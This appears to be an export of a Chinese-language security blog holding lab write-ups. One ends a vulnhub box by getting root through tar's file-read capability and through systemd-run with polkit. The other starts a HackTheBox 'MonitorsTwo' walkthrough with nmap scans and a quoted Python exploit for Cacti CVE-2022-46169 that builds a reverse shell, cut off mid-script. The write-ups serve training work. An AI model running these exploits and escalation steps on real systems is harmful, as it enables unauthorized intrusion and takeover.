: mp4v, mp42, isom<br>Movie Header Version            : 0<br>Create Date                     : 0000:00:00 00:00:00<br>Modify Date                     : 0000:00:00 00:00:00<br>Time Scale                      : 2285<br>Duration                        : 3.06 s<br>Preferred Rate                  : 1<br>Preferred Volume                : 100.00%<br>Preview Time                    : 0 s<br>Preview Duration                : 0 s<br>Poster Time                     : 0 s<br>Selection Time                  : 0 s<br>Selection Duration              : 0 s<br>Current Time                    : 0 s<br>Next Track ID                   : 2<br>Track Header Version            : 0<br>Track Create Date               : 0000:00:00 00:00:00<br>Track Modify Date               : 0000:00:00 00:00:00<br>Track ID                        : 1<br>Track Duration                  : 3.06 s<br>Track Layer                     : 0<br>Track Volume                    : 100.00%<br>Matrix Structure                : 1 0 0 0 1 0 0 0 1<br>Image Width                     : 224<br>Image Height                    : 224<br>Media Header Version            : 0<br>Media Create Date               : 0000:00:00 00:00:00<br>Media Modify Date               : 0000:00:00 00:00:00<br>Media Time Scale                : 2285<br>Media Duration                  : 3.06 s<br>Media Language Code             : und<br>Handler Type                    : Video Track<br>Graphics Mode                   : srcCopy<br>Op Color                        : 0 0 0<br>Compressor ID                   : avc1<br>Source Image Width              : 224<br>Source Image Height             : 224<br>X Resolution                    : 72<br>Y Resolution                    : 72<br>Bit Depth                       : 24<br>Video Frame Rate                : 2.285<br>Media Data Size                 : 5584<br>Media Data Offset               : 717<br>Image Size                      : 224x224<br>Megapixels                      : 0.050<br>Avg Bitrate                     : 14.6 kbps<br>Rotation                        : 0<br>======== game.jpg.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : game.jpg.bak<br>Directory                       : .<br>File Size                       : 40 kB<br>File Modification Date/Time     : 2019:10:10 22:16:38-04:00<br>File Access Date/Time           : 2023:06:12 10:27:16-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:16-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 192<br>Y Resolution                    : 192<br>Exif Byte Order                 : Big-endian (Motorola, MM)<br>Orientation                     : Horizontal (normal)<br>Comment                         : .... . -.-- ....... -. --- .-. .-. .. ... --..-- ....... -.-- --- ..- .----. ...- . ....... -- .- -.. . ....... - .... .. ... ....... ..-. .- .-. .-.-.- ....... ..-. .- .-. ....... ..-. .- .-. ....... ..-. .-. --- -- ....... .... . .- ...- . -. ....... .-- .- -. -. .- ....... ... . . ....... .... . .-.. .-.. ....... -. --- .-- ..--.. ....... .... .- .... .- ....... -.-- --- ..- ....... ... ..- .-. . .-.. -.-- ....... -- .. ... ... . -.. ....... -- . --..-- ....... -.. .. -.. -. .----. - ....... -.-- --- ..- ..--.. ....... --- .... ....... -.. .- -- -. ....... -- -.-- ....... -... .- - - . .-. -.-- ....... .. ... ....... .- -... --- ..- - ....... - --- ....... -.. .. . ....... .- -. -.. ....... .. ....... .- -- ....... ..- -. .- -... .-.. . ....... - --- ....... ..-. .. -. -.. ....... -- -.-- ....... -.-. .... .- .-. --. . .-. ....... ... --- ....... --.- ..- .. -.-. -.- .-.. -.-- ....... .-.. . .- ...- .. -. --. ....... .- ....... .... .. -. - ....... .. -. ....... .... . .-. . ....... -... . ..-. --- .-. . ....... - .... .. ... ....... ... -.-- ... - . -- ....... ... .... ..- - ... ....... -.. --- .-- -. ....... .- ..- - --- -- .- - .. -.-. .- .-.. .-.. -.-- .-.-.- ....... .. ....... .- -- ....... ... .- ...- .. -. --. ....... - .... . ....... --. .- - . .-- .- -.-- ....... - --- ....... -- -.-- ....... -.. ..- -. --. . --- -. ....... .. -. ....... .- ....... .----. ... . -.-. .-. . - ..-. .. .-.. . .----. ....... .-- .... .. -.-. .... ....... .. ... ....... .--. ..- -... .-.. .. -.-. .-.. -.-- ....... .- -.-. -.-. . ... ... .. -... .-.. . .-.-.-<br>Image Width                     : 712<br>Image Height                    : 350<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 712x350<br>Megapixels                      : 0.249<br>======== hits.txt.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : hits.txt.bak<br>Directory                       : .<br>File Size                       : 29 bytes<br>File Modification Date/Time     : 2019:10:10 22:26:23-04:00<br>File Access Date/Time           : 2023:06:12 10:27:22-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:22-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : (none)<br>Line Count                      : 1<br>Word Count                      : 1<br>======== m.gif.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : m.gif.bak<br>Directory                       : .<br>File Size                       : 933 kB<br>File Modification Date/Time     : 2019:10:10 21:43:29-04:00<br>File Access Date/Time           : 2023:06:12 10:27:27-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:27-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 245<br>Image Height                    : 245<br>Has Color Map                   : Yes<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 8<br>Background Color                : 255<br>Animation Iterations            : Infinite<br>XMP Toolkit                     : Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27<br>Creator Tool                    : Adobe Photoshop CS6 (Macintosh)<br>Instance ID                     : xmp.iid:085685312E1611E2A32B9E634BBB29DA<br>Document ID                     : xmp.did:085685322E1611E2A32B9E634BBB29DA<br>Derived From Instance ID        : xmp.iid:A5C200202E1511E2A32B9E634BBB29DA<br>Derived From Document ID        : xmp.did:085685302E1611E2A32B9E634BBB29DA<br>Transparent Color               : 255<br>Frame Count                     : 25<br>Duration                        : 2.50 s<br>Image Size                      : 245x245<br>Megapixels                      : 0.060<br>    4 image files <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><p>发现了字符串，似乎是摩斯电码，尝试在线工具解码</p><p><img src="/pic/2318451b3ceba9077ac3987e32ddd86a_MD5.png"></p><p>解码成功，得到了字符串，给了一个提示，意思是说有个 ‘secretfile’可以被公开访问，密码就在其中，继续查看 bak 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ <span class="hljs-built_in">cat</span> hits.txt.bak <br>https://pastebin.com/ZV1MLSEE<br></code></pre></td></tr></table></figure><p>给了一个网址，打开还是提示我们要尽力枚举。我们进到网站目录下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~/ftp/files$ <span class="hljs-built_in">cd</span> /var/www/html<br>norris@sirrom:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br>total 368K<br>264592 drwxr-xr-x 4 root     root     4.0K Oct 11  2019 .<br>264591 drwxr-xr-x 3 root     root     4.0K Oct 11  2019 ..<br>312910 -rw-r--r-- 1 www-data www-data 6.2K Oct 11  2019 backups<br>312911 -rw-r--r-- 1 www-data www-data  325 Oct 11  2019 backups.html<br>312916 -rw-r--r-- 1 www-data www-data  77K Oct 10  2019 bootstrap.bundle.min.js<br>312918 -rw-r--r-- 1 www-data www-data 153K Oct 10  2019 bootstrap.min.css<br>312909 -rw-r--r-- 1 www-data www-data   44 Oct 11  2019 hits.txt<br>312905 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 images<br>312904 -rw-r--r-- 1 www-data www-data 2.2K Oct 11  2019 index.htm<br>266382 -rw-r--r-- 1 www-data www-data 2.0K Oct 11  2019 index.html<br>312919 -rw-r--r-- 1 www-data www-data  70K Oct 10  2019 jquery.slim.min.js<br>312880 -rw-r--r-- 1 www-data www-data  879 Oct 11  2019 landing.css<br>312866 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 mysite<br>312922 -rw-r--r-- 1 www-data www-data   99 Oct 11  2019 secretfile<br>312917 -rw------- 1 www-data www-data  12K Oct 11  2019 .secretfile.swp<br></code></pre></td></tr></table></figure><p>确实有个 <code>secretfile</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ <span class="hljs-built_in">cat</span> secretfile <br>I see you<span class="hljs-string">&#x27;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.</span><br></code></pre></td></tr></table></figure><p>但是似乎没有信息，还有个 swp 文件，用户权限无法打开，经过搜索发现，可能是 vi 或者 vim 的缓存文件，wget 下载到本机，然后使用 <code>vim -r</code> 命令打开得到下图的结果</p><p><img src="/pic/fa9653bfc2a374c36947a5d7e5aacc33_MD5.png"></p><p>这样我们就拿到了又一个密码，尝试登录，经过测试发现是 <code>morris</code> 的密码，登录成功后，发现并不是 root 权限，还是需要进行提权。可以按照之前的手法来提权，这里复现一下红队笔记中采用的提权思路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ su morris<br>Password: <br>morris@sirrom:/var/www/html$ <span class="hljs-built_in">cd</span> /home<br>morris@sirrom:/home$ <span class="hljs-built_in">ls</span><br>morris  norris<br>morris@sirrom:/home$ <span class="hljs-built_in">cd</span> morris<br>morris@sirrom:~$ <span class="hljs-built_in">ls</span><br>Templates<br>morris@sirrom:~$ <span class="hljs-built_in">id</span><br>uid=1000(morris) gid=1000(morris) <span class="hljs-built_in">groups</span>=1000(morris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),117(lpadmin),118(scanner)<br><br></code></pre></td></tr></table></figure><h3 id="tar-命令读取-root-txt"><a href="#tar-命令读取-root-txt" class="headerlink" title="tar 命令读取 root.txt"></a>tar 命令读取 root.txt</h3><p>morris 和 norris 两个用户似乎差别并没有那么大，接下来就先在 norris 找一下提权的突破点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br>/usr/bin/tar = cap_dac_read_search+ep<br>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep<br>/usr/bin/ping = cap_net_raw+ep<br>norris@sirrom:/var/www/html$ su morris<br>Password: <br>morris@sirrom:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br>/usr/bin/tar = cap_dac_read_search+ep<br>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep<br>/usr/bin/ping = cap_net_raw+ep<br>morris@sirrom:/var/www/html$ tar -zcvf root.tat.gz /root<br>bash: /usr/bin/tar: Permission denied<br>morris@sirrom:/var/www/html$ <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>norris@sirrom:~$ tar -zcvf root.tar.gz /root<br>tar: Removing leading `/\<span class="hljs-string">&#x27; from member names</span><br><span class="hljs-string">/root/</span><br><span class="hljs-string">/root/root.txt</span><br><span class="hljs-string">/root/.bashrc</span><br><span class="hljs-string">/root/.gnupg/</span><br><span class="hljs-string">/root/.gnupg/private-keys-v1.d/</span><br><span class="hljs-string">/root/.bash_history</span><br><span class="hljs-string">/root/.cache/</span><br><span class="hljs-string">/root/.local/</span><br><span class="hljs-string">/root/.local/share/</span><br><span class="hljs-string">/root/.local/share/nano/</span><br><span class="hljs-string">/root/.profile</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>虽然两个用户的权限看起来一样，但是执行起来后，只有 norris 可以将 root 目录下的东西进行打包，解压缩后查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ tar -zxvf root.tar.gz <br>root/<br>root/root.txt<br>root/.bashrc<br>root/.gnupg/<br>root/.gnupg/private-keys-v1.d/<br>root/.bash_history<br>root/.cache/<br>root/.local/<br>root/.local/share/<br>root/.local/share/nano/<br>root/.profile<br>norris@sirrom:~$ <span class="hljs-built_in">cat</span> root/root.txt <br>8fc9376d961670ca10be270d52eda423<br></code></pre></td></tr></table></figure><p>emmm，怎么说呢，这个思路确实很骚，在一些只希望获取到某些文件或者 flag 的情况下或许会非常有帮助，而 getcap 命令我是第一次见到，也算学习了</p><h3 id="polkit-agent-helper-1-提权"><a href="#polkit-agent-helper-1-提权" class="headerlink" title="polkit-agent-helper-1 提权"></a>polkit-agent-helper-1 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper<br>/usr/lib/xorg/Xorg.wrap<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/sbin/pppd<br>/usr/sbin/mount.nfs<br>/usr/bin/gpasswd<br>/usr/bin/umount<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/fusermount<br>/usr/bin/chfn<br>/usr/bin/bwrap<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/pkexec<br>/usr/bin/ntfs-3g<br>/usr/bin/chsh<br>/usr/bin/sudo<br></code></pre></td></tr></table></figure><p>polkit-agent-helper-1 用于提权我也是第一次遇到，之后还是得按红队笔记的视频汇总一下提权手法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">morris@sirrom:~$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                <br>Authenticating as: norris,,, (norris)<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit: run-u127.service                                                                                   <br>Press ^] three <span class="hljs-built_in">times</span> within 1s to disconnect TTY.<br>root@sirrom:/<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@sirrom:/<span class="hljs-comment"># cat /root/root.txt</span><br>8fc9376d961670ca10be270d52eda423<br>root@sirrom:/<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>polkit 是 Linux 权限管理的一套机制（policy kit），helper 是当操作文件需要权限的时候，helper 会给一个交互界面，如果想办法调用 helper 进而带来权限上的提升。systemd-run 是临时启动高权限，这时候就会调用 helper，进而获取到 helper 属主的权限。这里有个有意思的事情，就是运行后需要授权密码，需要的是 norris 的密码</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MonitorsTwo靶机</title>
    <link href="/2023/06/f734793d82e5.html"/>
    <url>/2023/06/f734793d82e5.html</url>
    
    <content type="html"><![CDATA[<h1 id="MonitorsTwo-靶机"><a href="#MonitorsTwo-靶机" class="headerlink" title="MonitorsTwo 靶机"></a>MonitorsTwo 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.211<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 07:34 EDT<br>Warning: 10.10.11.211 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.211<br>Host is up (0.036s latency).<br>Not shown: 64538 closed tcp ports (reset), 995 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.40 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.211<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 07:35 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.211<br>Host is up (0.0034s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)<br>|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)<br>|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Login to Cacti<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.77 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sU --top-ports 20 10.10.11.21<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 07:40 EDT<br>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="hljs-keyword">in</span> 3.08 seconds<br><br></code></pre></td></tr></table></figure><h2 id="Cacti-1-2-22-远程代码执行漏洞"><a href="#Cacti-1-2-22-远程代码执行漏洞" class="headerlink" title="Cacti 1.2.22 远程代码执行漏洞"></a>Cacti 1.2.22 远程代码执行漏洞</h2><p>80 端口是开放的，点击进去看到是 Cacti 1.2.22</p><p><img src="/pic/598625b756b195fefd96ee11b0438fe9_MD5.png"></p><p>搜一下相关 exp</p><p><img src="/pic/80f54b7d6997e728ef9724e7c5a23579_MD5.png"></p><p>有很多利用的脚本，但是运行都有点问题，尝试手动利用，查到有个 <a href="https://github.com/0xf4n9x/CVE-2022-46169">0xf4n9x&#x2F;CVE-2022-46169: CVE-2022-46169 Cacti remote_agent.php Unauthenticated Command Injection. (github.com)</a> 其中包含了用 burpsuite 进行验证的流程</p><p><img src="/pic/3b15eb48a3fc37543da36368d34a72a0_MD5.png"></p><p>并不需要爆破 id，这里后面两个值都为 1，就可以得到预期的返回。但是在后面添加代码的时候，没有真正的执行，后面参考了另一个 exp，但是 curl 命令有效，而反弹 shell 命令无效，猜测可能是编码的问题？找了几个 exp 都失败，就直接看 WP 了，<a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py">CVE-2022-46169-CACTI-1.2.22&#x2F;CVE-2022-46169.py at main · FredBrave&#x2F;CVE-2022-46169-CACTI-1.2.22 · GitHub</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests, optparse, sys<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_arguments</span>():<br>    parser= optparse.OptionParser()<br>    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--url&#x27;</span>, dest=<span class="hljs-string">&#x27;url_target&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The url target&#x27;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;--LHOST&#x27;</span>, dest=<span class="hljs-string">&#x27;lhost&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Your ip&#x27;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;--LPORT&#x27;</span>, dest=<span class="hljs-string">&#x27;lport&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The listening port&#x27;</span>)<br>    (options, arguments) = parser.parse_args()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.url_target:<br>        parser.error(<span class="hljs-string">&#x27;[*] Pls indicate the target URL, example: -u http://10.10.10.10&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.lhost:<br>        parser.error(<span class="hljs-string">&#x27;[*] Pls indicate your ip, example: --LHOST=10.10.10.10&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.lport:<br>        parser.error(<span class="hljs-string">&#x27;[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443&#x27;</span>)<br>    <span class="hljs-keyword">return</span> options<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkVuln</span>():<br>    r = requests.get(Vuln_url, headers=headers)<br>    <span class="hljs-keyword">return</span> (r.text != <span class="hljs-string">&quot;FATAL: You are not authorized to use this service&quot;</span> <span class="hljs-keyword">and</span> r.status_code != <span class="hljs-number">403</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteForcing</span>():<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>        <span class="hljs-keyword">for</span> n2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>            id_vulnUrl = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Vuln_url&#125;</span>?action=polldata&amp;poller_id=1&amp;host_id=<span class="hljs-subst">&#123;n&#125;</span>&amp;local_data_ids[]=<span class="hljs-subst">&#123;n2&#125;</span>&quot;</span><br>            r = requests.get(id_vulnUrl, headers=headers)<br>            <span class="hljs-keyword">if</span> r.text != <span class="hljs-string">&quot;[]&quot;</span>:<br>                RDname = r.json()[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;rrd_name&quot;</span>]<br>                <span class="hljs-keyword">if</span> RDname == <span class="hljs-string">&quot;polling_time&quot;</span> <span class="hljs-keyword">or</span> RDname == <span class="hljs-string">&quot;uptime&quot;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Bruteforce Success!!&quot;</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, n, n2<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Reverse_shell</span>(<span class="hljs-params">payload, host_id, data_ids</span>):<br>    PayloadEncoded = urllib.parse.quote(payload)<br>    InjectRequest = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Vuln_url&#125;</span>?action=polldata&amp;poller_id=;<span class="hljs-subst">&#123;PayloadEncoded&#125;</span>&amp;host_id=<span class="hljs-subst">&#123;host_id&#125;</span>&amp;local_data_ids[]=<span class="hljs-subst">&#123;data_ids&#125;</span>&quot;</span><br>    r = requests.get(InjectRequest, headers=headers)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    options = get_arguments()<br>    Vuln_url = options.url_target + <span class="hljs-string">&#x27;/remote_agent.php&#x27;</span><br>    headers = &#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>&#125;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Checking...&#x27;</span>)<br>    <span class="hljs-keyword">if</span> checkVuln():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The target is vulnerable. Exploiting...&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Bruteforcing the host_id and local_data_ids&quot;</span>)<br>        is_vuln, host_id, data_ids = bruteForcing()<br>        myip = options.lhost<br>        myport = options.lport<br>        payload = <span 